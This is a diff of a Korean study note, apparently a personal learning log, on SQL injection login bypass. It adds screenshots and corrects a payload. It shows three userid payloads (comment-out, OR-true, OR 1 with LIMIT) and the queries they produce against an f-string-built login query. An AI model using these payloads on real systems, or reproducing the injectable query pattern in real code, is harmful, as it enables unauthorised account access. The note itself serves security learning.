@@ -128,6 +128,7 @@ res = query_db(f’select * from users where userid="{userid}" and userpassword=
           ```SQL
           select * from users where userid="admin"--" and userpassword="DUMMY"
           ```
+	<img width="1146" alt="sqli_1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/e09d2011-6c60-4cce-9097-c99dabc535d5">
 
   2. userid 검색 조건 뒤에 ```OR``` 조건을 추가하여 뒤의 내용과 관계없이 admin이 반환되도록 하는 방식
       - userid, userpassword 입력값
@@ -139,16 +140,22 @@ res = query_db(f’select * from users where userid="{userid}" and userpassword=
           select * from users where userid="admin" or "1" and userpassword="DUMMY"
           ```
 
+	<img width="1146" alt="sqli_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/aa28fe5e-cc5a-421b-9e53-299accf9b321">
+
   3. userid 검색 조건 뒤에 ```or 1```을 추가하여 테이블의 모든 내용을 반환하도록 하고, ```LIMIT``` 절을 이용해 admin 행만 반환하도록 하는 방식
       - userid, userpassword 입력값
 		    | userid | userpassword |
         |-----|-----|
-        | "" or 1 LIMIT 1,1 -- | DUMMY (아무 문자열이나 입력해도 상관 없음) |
+        | " or 1 LIMIT 1,1 -- | DUMMY (아무 문자열이나 입력해도 상관 없음) |
         + 생성되는 쿼리문
           ```SQL
           select * from users where userid="" or 1 LIMIT 1,1--" and userpassword="DUMMY"
           ```
 
+	<img width="1146" alt="sqli_3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/93a4fa37-d32f-459f-8f20-491752892a62">
+
+* SQL Injection 수행 결과
+	<img width="1146" alt="sqli_result" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/e7b5e886-90c1-427e-94d0-103bc1cfda2e">
 
 <br/>
 
